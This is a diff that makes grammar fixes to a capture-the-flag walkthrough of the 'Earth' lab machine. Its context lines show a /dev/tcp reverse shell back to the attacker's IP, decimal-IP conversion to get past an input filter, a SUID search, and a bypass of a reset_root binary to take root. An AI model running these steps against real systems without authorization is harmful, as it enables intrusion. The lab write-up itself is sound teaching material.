@@ -381,7 +381,7 @@ ls -l /home
 Command output: total 0 drwx------. 4 earth earth 141 Oct 13 00:23 earth 
 ```
 
-So there is a user with nickname "earth". His home directory has correct permission (as expected), so we can't access anything in it.
+So there is a user with nickname "earth". His home directory has correct permissions (as expected), so we can't access anything in it.
 
 Apache surely has access to the public html directories. Let's try it.
 
@@ -405,13 +405,13 @@ ls -a /var/www/html/terratest.earth.local
 Command output: . .. index.html robots.txt testdata.txt testingnotes.txt 
 ```
 
-cgi-bin directory is. unfortunately, empty. The host dir contains files that we have already downloaded and seen. No surprises and no new info.
+cgi-bin directory is, unfortunately, empty. The host dir contains files that we have already downloaded and seen. No surprises and no new info.
 
-So what know? We must be honest here. This is the most difficult point. In real world, when someone looks for escalation to root or even user account he does not know if this is possible. The reason is simple. Linux machines are security oriented (always have been) without a misconfiguration or some other security pitfall is  is not possible for escalation to happen. This si especially true for servers that care about security. So an attacker can search forever without progress. That does not mean in real world unix type machines are invulnerable. Many of there are, it is just too difficult to be exploited, or simpler the attacker does not know if a vulnerability exists in the system. Which is very disheartening. This is the reason why persistence and patience are virtues for cybersecurity operations.
+So what know? We must be honest here. This is the most difficult point. In real world, when someone looks for escalation to root or even user account he does not know if this is possible. The reason is simple. Linux machines are security oriented (always have been). Without a misconfiguration or some other security pitfall it  is not possible for escalation to happen. This is especially true for servers that care about security. So an attacker can search forever without progress. That does not mean that in real world unix type machines are invulnerable. Many of these are, it is just too difficult to be exploited, or simpler the attacker does not know if a vulnerability exists in the system. Which is very disheartening. This is the reason why persistence and patience are virtues for cybersecurity operations.
 
-Our target does not belong to this category. It is setup that way to contain at least one weak points, which waits to be exploited. So we can be encouraged by this and move on.
+Our target does not belong to this category. It is setup that way to contain at least one weak point, which waits to be exploited. So we can be encouraged by this and move on.
 
-The next step is to get a "normal" bash shell to work. The admin tool (web interface restricts us). So we need a reverse shell. We are going to anchor (connect) to our machine by initiating the connection from the target machine. This is very common and the reason is that many machines use firewalls which have inbound rules but not outbound rules, making a reverse shell opening possible. 
+The next step is to get a "normal" bash shell to work. The admin tool (web interface) restricts us. So we need a reverse shell. We are going to anchor (connect) to our machine by initiating the connection from the target machine. This is very common and the reason is that many machines use firewalls which have inbound rules but not outbound rules, making a reverse shell opening possible. 
 
 Our first step is to "open" a port. That means to make a port listening and also be sure that there is no firewall blocking this port on our attacking machine. This port is better be greater than 1024, so no root privileges are needed. Of course we can use any port that is not in use, and because we own our machine we have root access, but for security reasons it is better not to use root to open a port (you never know what can happen). Let's peek port 23456. On our machine we execute:
 
@@ -434,7 +434,7 @@ sh -i >& /dev/tcp/10.0.2.4/23456 0>&1
 Command output:
 ```
 
-Nothing happened. Disappointing. A possible reason is that the tool has some basic build in security, detecting an IP format and rejecting it if this is the case. It is worth trying to convert the IP format by presenting it without dots. We have two options here, converting "10.0.2.4" to decimal format (by the way, this IP is the attacking machine's IP) or we can convert it to base 64 as a payload. Let's follow the former. We can use an inline tool for conversion, but, as geeks it will be better to write our own script. Right? Right.
+Nothing happened. Disappointing. A possible reason is that the tool has some basic build in security, detecting an IP format and rejecting it if this is the case. It is worth trying to convert the IP format by presenting it without dots. We have two options here, converting "10.0.2.4" to decimal format (by the way, this IP is the attacking machine's IP) or we can convert it to base 64 as a payload. Let's try the former. We can use an online tool for conversion, but, as geeks it will be better to write our own script. Right? Right.
 
 Conversion is easy, we just write and save the following script:
 
@@ -477,7 +477,7 @@ apache python3 -c 'import pty;pty.spawn("/bin/bash")'
 sh-5.1$
 ```
 
-It works! We can now use the bash from our own machine. The shell and terminal are very basic though. It will be good to improve it.
+It works! We can now use the bash from our own machine. The shell and terminal are very basic though. It is a good idea  to somewhat improve it.
 
 
 ```
@@ -489,7 +489,7 @@ dumb
 
 We have a pseudo-terminal now(which is dumb).
 
-As we don't have a hint about how to get user access (we just know the username, which should be earth because it is the dir name in */home/*) we can try to escalate directly to root. Attackers often  forget that getting superuser access automatically grants them access to any user account. Of course the most common case is to get user access first and use this access level to escalate to root. In our situation we already have access to an account (apache) and we don't have a clue how to get access to earth user account. It is more logical to try escalating directly to root; if we hit a dead end then we can come back to try again getting user account. If we get root access we save time to get user account access.
+As we don't have a hint about how to get user access (we just know the username, which should be earth because it is the dir name in */home/*) we can try to escalate directly to root. Attackers often  forget that getting superuser access automatically grants them access to any user account. Of course the most common case is to get user access first and use this access level to escalate to root. In our situation we already have access to an account (apache) and we don't have a clue how to get access to the earth user account. It is more logical to try escalating directly to root; if we hit a dead end then we can come back to try again getting user account. If we get root access we save time to get user account access.
 
 ### Escalation to root
 
@@ -518,12 +518,12 @@ find / -perm -4000 2>/dev/null
 /usr/lib/polkit-1/polkit-agent-helper-1
 ```
 
-All these files have the UID set. That mean that when executed the linux system executes the as the **owner** of the file and not the account that executes them. For example, when running **sudo* command, it runs as root and not as the user that runs it. From all the above, on file catches our eye: 
+All these files have the UID set. This means that when executed the linux system executes them as the **owner** of the file and not the account that executes them. For example, when running **sudo** command, it runs as root and not as the user that runs it. From all the above, on file catches our eye: 
 ```
 /usr/bin/reset_root
 ```
 
-This is a non-standard command. Maybe it is able to reset the root password ? Of course, to be able to do that it must run as root. To whom this file belongs ?
+This is a non-standard command. Maybe it is able to reset the root password ? Of course, to be able to do that it must run as root. But to whom this file belongs ?
 
 ```
 bash-5.1$ ls -l /usr/bin/reset_root
@@ -550,7 +550,7 @@ file /usr/bin/reset_root
 ```
 
 
-Bad luck. It is a binary file. We know that because of the ELF format. That means that we must reverse engineering it just to know what it does exactly. Not an easy job at all.
+Bad luck. It is a binary file. We know that because of the ELF format. This means that we must reverse engineer it just to know what it does exactly. Not an easy job at all.
 
 But wait a minute. the file is not stripped, which means that it contains debug information, symbols and many more. Using *strings* command we can get more info.
 
@@ -584,7 +584,7 @@ GCC: (GNU) 11.1.1 20210531 (Red Hat 11.1.1-3)
 ...
 ``` 
 
-Very interesting. The binary file execute library call (puts,system,access). We can also see ASCII strings that maybe printed on condition, like "RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth". **/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd* is even more revealing, is it shows that password is set to "Earth". We must find what goes wrong and fix it to get this result.
+Very interesting. The binary file executes library calls (puts,system,access). We can also see ASCII strings that maybe printed on condition, like "RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth". **/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd** is even more revealing, is it shows that password is set to "Earth". We must find what goes wrong and fix it to get this result.
 
 *ltrace* can be used here. This command traces the library calls, so it can hopefully enlighten us of how the program works.
 
@@ -635,14 +635,14 @@ reset_root: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically lin
 ```
 
 
-What we have done is to redirect the output of teh file using netcat to a file and not to our terminal. Let's run ltrace on it:
+What we have done is to redirect the output of the file using netcat to a file and not to our terminal. Let's run ltrace on it:
 
 ```
 $ ltrace ./reset_root
 bash: ltrace: command not found
 ```
 
-I don't have ltrace installed yet, so I am going to install it. This is distro depended. For my machine, because it is Debian, I install and try again:
+I don't have ltrace installed yet, so I am going to install it. This is distro depended. For my machine, because it is Debian, I install the ltrace pacjage and try again:
 
 ```
 sudo apt-get update && sudo apt-get install ltrace
@@ -681,7 +681,7 @@ DESCRIPTION
 ...
 ```
 
-If we are able to create this files then we can bypass the checking. So, back on our target machine we execute:
+If we are able to create this files then we may bypass the checking. So, back on our target machine we execute:
 
 ```
 bash-5.1$ touch /dev/shm/kHgTFI5G
@@ -696,7 +696,7 @@ ls /dev/shm/kHgTFI5G
 bash-5.1$ 
 ```
 
-Everything gone as planned. Now is the moment of truth.
+Everything gone as planned. Now comes the moment of truth.
 
 ```
 bash-5.1$ /usr/bin/reset_root
@@ -809,7 +809,7 @@ find / -name '*_flag*'
 /home/earth/.local/lib/python3.9/site-packages/django/contrib/admin/migrations/__pycache__/0003_logentry_add_action_flag_choices.cpython-39.pyc
 ```
 
-Aha! Our boy must be the file **/var/earth\_web/user\_flag.txt*
+Aha! Our boy must be the file **/var/earth\_web/user\_flag.txt**
 
 ```
 [root@earth earth]# cat /var/earth_web/user_flag.txt
@@ -823,9 +823,9 @@ So the user flag is **3353b67d6437f07ba7d34afd7d2fc27d**
 ### Reversing any harmful changes done to the system
 
 Before recapping, we must reverse any changes or damage done to the target. We have changed the 
-root password, which is a very important thing. We should reverse the root access back to the old password. Generally speaking, someone shouldn't try to target machines that he does not own without authorization from the owner. Also, servers in production or otherwise should not be altered in any way. In case that they do the changes must be reversed as much as possible. If serious changes take place and we suspect that this may have an impact to a production server then owner must also be notified about the changes and duration that took place.
+root password, which is a very important thing. We should reverse the root access back to the old password. Generally speaking, someone shouldn't try to target machines that he does not own without authorization from the owner. Also, servers in production or otherwise should not be altered in any way. In case that they do, the changes must be reversed as much as possible. If serious changes take place and we suspect that this may have an impact to a production server then the owner must be notified about the changes and duration that took place.
 
-Building good habits, we should reverse the change, that is, change the root password back to original. If this looks impossible at first to some (as we don't really know the original password), it really isn't. In fact it is very easy if someone has root access. Linux never saves user passwords anywhere; it saves only the hash of the passwords, which it creates only when the account is created or a password is changed. After that, it deletes thw password from its memory and the hashes stays in the disk. Every time someone is trying to login the OS hashes the password, compare the hashes and allow login if they match. All hashes are in the file */etc/shadow*. Fortunately, because Linux is a vary good architected OS and grained to detail, it keeps the previous changes in another file, namely */etc/shadow-*. Let us see this in reverse the password change:
+To build good habits we should reverse the change, that is, change the root password back to original. If this looks impossible at first to some (as we don't really know the original password), it really isn't. In fact it is very easy if someone has root access. Linux never saves user passwords anywhere; it saves only the hash of the passwords, which it creates only when the account is created or a password is changed. After that, it deletes the password from its memory and the hash stays in the disk. Every time someone is trying to login the OS hashes the password, compare the hashes and allows login if they match. All hashes are in the file */etc/shadow*. Fortunately, because Linux is a vary good architected OS and grained to detail, it keeps the previous changes in another file, namely */etc/shadow-*. Let us see this in reversing the password change:
 
 ```
 [root@earth ~]# cd /etc
@@ -864,8 +864,9 @@ Password: Earth
 su: Authentication failure
 ```
 
-Perfect. We are done, we close the port we used as anchor to our system by *nc*.
-We could also try covering our tracks by cleaning apache log files in */var/log* but this is beyond the scope of getting the flags and also is closer to black hat hating, so let's skip this part.
+Perfect. We are done. We close the port we used as anchor to our system by *nc*.
+We could also try covering our tracks by cleaning apache log files in */var/log*, history files etc but this is beyond the scope of getting the flags and also is closer to black hat hacking, so let's skip this part.
 
 ### Conclusion
+
 
